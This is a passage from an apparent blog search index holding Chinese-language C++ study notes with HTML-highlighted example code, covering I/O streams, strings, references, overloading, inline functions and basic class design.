class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;位置:(&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;),方向：&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (direction == <span class="number">0</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;上&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">90</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;右&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">180</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;下&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">270</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;左&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="week-2"><a href="#week-2" class="headerlink" title="week 2"></a>week 2</h2><p>设计一个简单的机器人任务管理系统，使用类来管理机器人的任务，包括任务的创建、执行以及任务的状态更新</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++面向对象编程</title>
      <link href="/2025/11/27/C++/C++%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E6%9C%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/11/27/C++/C++%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E6%9C%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="C-输入输出"><a href="#C-输入输出" class="headerlink" title="C++输入输出"></a>C++输入输出</h2><h3 id="控制台输出：标准输出流"><a href="#控制台输出：标准输出流" class="headerlink" title="控制台输出：标准输出流"></a>控制台输出：标准输出流</h3><p>利用cout工具<br>准确来说：iostream库中，std名字空间下，一个名叫cout的对象<br>用法：std::cout &lt;&lt;要输出的内容<br>ps:”&lt;&lt;”是流插入运算符</p><h3 id="控制台输出：标准输入流"><a href="#控制台输出：标准输入流" class="headerlink" title="控制台输出：标准输入流"></a>控制台输出：标准输入流</h3><p>利用cin工具<br>准确来说：iostream库中，std名字空间下，一个名叫cin的对象<br>用法：std::cin &gt;&gt;要输出的内容<br>ps:”&gt;&gt;”是流提取运算符</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line">std::cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;=&quot;</span> &lt;&lt; a + b;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;hello world!\n&quot;;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="comment">//3</span></span><br><span class="line"><span class="comment">//2+3=5</span></span><br></pre></td></tr></table></figure><h2 id="名字空间的概念"><a href="#名字空间的概念" class="headerlink" title="名字空间的概念"></a>名字空间的概念</h2><h3 id="名字空间vs库（头文件）"><a href="#名字空间vs库（头文件）" class="headerlink" title="名字空间vs库（头文件）"></a>名字空间vs库（头文件）</h3><p>本质不同：<br>名字空间是逻辑概念，类似于贴标签：一个名字空间是一种标签纸<br>库是物理概念，类似于工具箱：一个库含有多个同类工具<br>目的不同：<br>名字空间为了区分不同工具箱里的同名工具，避免同名歧义<br>库为了将不同用途的工具分别装在不同的箱子里，实现解耦</p><h2 id="字符串类string"><a href="#字符串类string" class="headerlink" title="字符串类string"></a>字符串类string</h2><p>string是C++的字符串类<br>C语言中用char[]来存放字符串，用char*表示一个字符串，但是有烦人的指针合法性问题和‘\0’问题<br>C++中新增了string类来表示字符串，并提供了一系列工具供使用（函数（功能、方法…））<br>string实际上封装了char[]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::string s = <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; s &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">std::cout &lt;&lt; s.<span class="built_in">length</span>() &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">s[<span class="number">2</span>] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">std::cout &lt;&lt; s;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简洁版本：using关键字的作用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string  <span class="comment">//using关键字的作用</span></span><br><span class="line"><span class="function"><span class="keyword">using</span> std::cout</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">string s = <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">cout &lt;&lt; s &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">cout &lt;&lt; s.<span class="built_in">length</span>() &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">s[<span class="number">2</span>] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">cout &lt;&lt; s;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自增自减运算符"><a href="#自增自减运算符" class="headerlink" title="自增自减运算符"></a>自增自减运算符</h2><h2 id="bool类型"><a href="#bool类型" class="headerlink" title="bool类型"></a>bool类型</h2><p>布尔（bool）类型：<br>回顾C语言判断逻辑真假规则：表达式值为非0-&gt;肯定，值为0-&gt;否定<br>C++引入了bool类型，取值只能为true（真）或false（假）<br>bool变量本质是单字节无符号整数0或1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">bool</span> a = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (a) &#123;</span><br><span class="line">cout &lt;&lt; a;<span class="comment">//1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> a = <span class="literal">true</span>, b = !a;</span><br><span class="line"><span class="keyword">if</span> (a&amp;&amp;b) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//no</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> a = <span class="literal">true</span>;</span><br><span class="line">   a=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (a) &#123;</span><br><span class="line">cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br><span class="line">   <span class="comment">//1</span></span><br></pre></td></tr></table></figure><h2 id="回顾函数概念"><a href="#回顾函数概念" class="headerlink" title="回顾函数概念"></a>回顾函数概念</h2><h3 id="函数的目的"><a href="#函数的目的" class="headerlink" title="函数的目的"></a>函数的目的</h3><p>函数是面向过程的体现：输入（参数） -&gt; 处理流程 -&gt; 输出（返回值）<br>目的：将重复发生的过程进行统一描述，实现代码复用与解耦<br>·代码复用：避免重复写相同代码<br>·解耦：避免发生改动时牵一发而动全身</p><h3 id="函数声明（原型）与定义（实现）"><a href="#函数声明（原型）与定义（实现）" class="headerlink" title="函数声明（原型）与定义（实现）"></a>函数声明（原型）与定义（实现）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> c=a+b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数值传参与指针传参：<br>·值传参与指针传参实际上没有区别！<br>·Why?回顾一个指针变量的值是什么？是一个地址！<br>·指针传参实际就是指针的值传递</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//交换两变量的值</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> *pa,<span class="type">int</span> *pb)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t=*pa;</span><br><span class="line">    *pa=*pb;</span><br><span class="line">    *pb=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> m=<span class="number">10</span>,n=<span class="number">20</span>;</span><br><span class="line"><span class="type">int</span> *pm=&amp;m,*pn=&amp;n;</span><br><span class="line"><span class="built_in">swap</span>(pm,pn);</span><br></pre></td></tr></table></figure><p>实际上就是pm和pn对pa和pb的值传参（拷贝）<br>全因指针的值是地址而让指针传参显得特殊</p><h2 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h2><p>默认值（default）的概念：<br>·回顾：计算机程序必要因素之确定性<br>·程序不怕做错事，怕无法确定自己到底要做什么<br>·默认值：告诉程序当数据&#x2F;指令缺失时，默认用什么来替代，避免失去确定性<br>没传实参 -&gt; 用默认值  ！！！！必须在声明中声明默认参数！<br>传了实参 -&gt; 用传进来的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">power</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> x = <span class="number">2</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">power</span>(<span class="number">5</span>) &lt;&lt; endl;  <span class="comment">//25</span></span><br><span class="line">cout &lt;&lt; <span class="built_in">power</span>(<span class="number">4</span>,<span class="number">3</span>) &lt;&lt; endl;<span class="comment">//64</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">power</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; x; i++) &#123;</span><br><span class="line">ans *= n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="引用传参"><a href="#引用传参" class="headerlink" title="引用传参"></a>引用传参</h2><p>引用：其实就是别名<br>· 特指左值引用，即给一个已经有名字的变量起别名，所以不可存在空引用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>&amp; b = a, &amp; c = b;<span class="comment">//别名引用</span></span><br><span class="line">cout &lt;&lt; b&lt;&lt;endl;<span class="comment">//10</span></span><br><span class="line">c++;</span><br><span class="line">cout &lt;&lt; a;<span class="comment">//11</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、思考：指针传参解决了什么问题？<br>·避免按值传参发生的拷贝，实现了原地改动调用方传入参数的功能</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> t = a;</span><br><span class="line">a = b;</span><br><span class="line">b = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> m=<span class="number">1</span>,n=<span class="number">2</span>;</span><br><span class="line"><span class="built_in">swap</span>(m, n);</span><br><span class="line">cout &lt;&lt; m &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; n &lt;&lt; endl;<span class="comment">//2,1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数重载-overload"><a href="#函数重载-overload" class="headerlink" title="函数重载 overload"></a>函数重载 overload</h2><p>· 多个函数的名字相同，参数列表（数量、类型）不同</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b + c + d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还可用用形参的类型不同哟！<br>Q1：overload解决了什么问题？<br>· 减少了函数调用方地代码冗余，现在调用对不同类型&#x2F;数量的实参可以写完全一样的代码了<br>Q2：存在问题？<br>· 代码有可能存在歧义<br>Q3：如何避免？<br>· 不允许仅有返回值不同的函数重载：重载是争对参数列表的！（函数重载的题目不需要看返回值）</p><h2 id="内联函数（inline）"><a href="#内联函数（inline）" class="headerlink" title="内联函数（inline）"></a>内联函数（inline）</h2><p>函数目的：将重复发生的流程统一起来，实现代码复用和解耦<br>如果某个函数的功能非常简单，又被反复调用，那么调用这个函数的“额外开销”占比就很大了。此时可以建议编译器在编译时将函数直接在调用处展开，避免函数调用行为的额外开销</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">getMax</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? (a &gt; c ? a : c) : (b &gt; c ? b : c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">getMax</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">cout &lt;&lt; <span class="built_in">getMax</span>(<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">cout &lt;&lt; <span class="built_in">getMax</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">cout &lt;&lt; <span class="built_in">getMax</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">cout &lt;&lt; <span class="built_in">getMax</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">cout &lt;&lt; <span class="built_in">getMax</span>(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并不是写了inline关键字就一定会被内联，只是提出建议，由编译器决定是否采纳<br>内联这个动作发生在编译时，提升运行时的效率</p><h2 id="面向对象思想"><a href="#面向对象思想" class="headerlink" title="面向对象思想"></a>面向对象思想</h2><p>核心思想：<br>既然随着系统参与实体的增多，过程变得复杂，那就不费力描述每一个可能的过程了，转而描述每一个实体。如果每一个实体都被正确描述了，那么将这些实体置于系统中，系统就能正确运行了。（属性+行为）</p><h2 id="抽象与UML图"><a href="#抽象与UML图" class="headerlink" title="抽象与UML图"></a>抽象与UML图</h2><p>· 抽象 Abstract<br>分析问题，识别出各个实体及其属性和行为<br>· UML类图<br>识别出问题中各个实体(属性+行为)后，需用规范的方式描述<br>1、类名<br>2、属性（成员变量）<br>3、行为（成员方法）<br>+&#x2F;-是访问控制类别（+是public，-是private）</p><h2 id="类和对象实现"><a href="#类和对象实现" class="headerlink" title="类和对象实现"></a>类和对象实现</h2><h3 id="定义一个类"><a href="#定义一个类" class="headerlink" title="定义一个类"></a>定义一个类</h3><p>定义一个类 &#x3D; 定义它的属性（成员变量）+行为（成员函数）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">float</span> radius;</span><br><span class="line"><span class="built_in">Circle</span>(<span class="type">float</span> radius) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;radius = radius;<span class="comment">//this为指针，表当前对象//灰色为形参，亮色为成员变量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">getS</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">3.14</span> * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">getC</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * <span class="number">3.14</span> * radius;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">Circle <span class="title">c1</span><span class="params">(<span class="number">2.5f</span>)</span>, <span class="title">c2</span><span class="params">(<span class="number">6.f</span>)</span></span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;c1的半径：&quot;</span> &lt;&lt; c<span class="number">1.</span>radius &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;c2的半径：&quot;</span> &lt;&lt; c<span class="number">2.</span>radius &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;c1的面积：&quot;</span> &lt;&lt; c<span class="number">1.</span><span class="built_in">getS</span>() &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;c1的周长：&quot;</span> &lt;&lt; c<span class="number">1.</span><span class="built_in">getC</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结构体VS类"><a href="#结构体VS类" class="headerlink" title="结构体VS类"></a>结构体VS类</h3><p>简单理解：结构体+行为（成员函数）&#x3D;类<br>根据使用场景选择结构体或类:<br>· 结构体：主要记录数据，极少行为（如资源配置信息、网络连接信息等）<br>· 类：既有属性又有行为（如学生类、用户类、玩家类等）<br>类是对象的抽象，对象是类的具体</p><h3 id="特殊成员函数"><a href="#特殊成员函数" class="headerlink" title="特殊成员函数"></a>特殊成员函数</h3><p>特殊成员函数：构造函数（constructor）与析构函数（destructor）<br>· 构造：对象实例化时，在分配得到的空间上构造对象（如初始化成员变量、分配资源等）<br>注意：在默认构造函数：没有参数的构造函数；有参构造函数：有参数的构造函数<br>· 析构：对象生命周期结束时，回收空间前，完成对象的清理工作（如释放资源等）<br>注意：析构函数没有返回值！析构函数没有参数！</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">char</span>* data = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="built_in">A</span>(<span class="type">int</span> n) &#123;<span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">data = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">A</span>() &#123;<span class="comment">//析构函数</span></span><br><span class="line"><span class="built_in">free</span>(data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h3><p>this的中文含义：这、这个、当前这个<br>this指针在类定义内部使用，指向当前对象</p><h2 id="封装与读写接口"><a href="#封装与读写接口" class="headerlink" title="封装与读写接口"></a>封装与读写接口</h2><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>封装（Encapsulate）:将类的一些成员变量或方法藏起来，不允许外界直接操作<br>不允许直接操作不等于不允许操作，而是通过自定义的特定方法操作<br>ps:藏起来即为访问控制属性，分为：public 公有; protected 保护; private 私有</p><h3 id="getter-setter方法"><a href="#getter-setter方法" class="headerlink" title="getter&#x2F;setter方法"></a>getter&#x2F;setter方法</h3><p>为某些私有成员变量提供外部读写方法：get_xxx(读)&#x2F;set_xxx(写)<br>getter和setter一般是public的，不然没有意义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">string 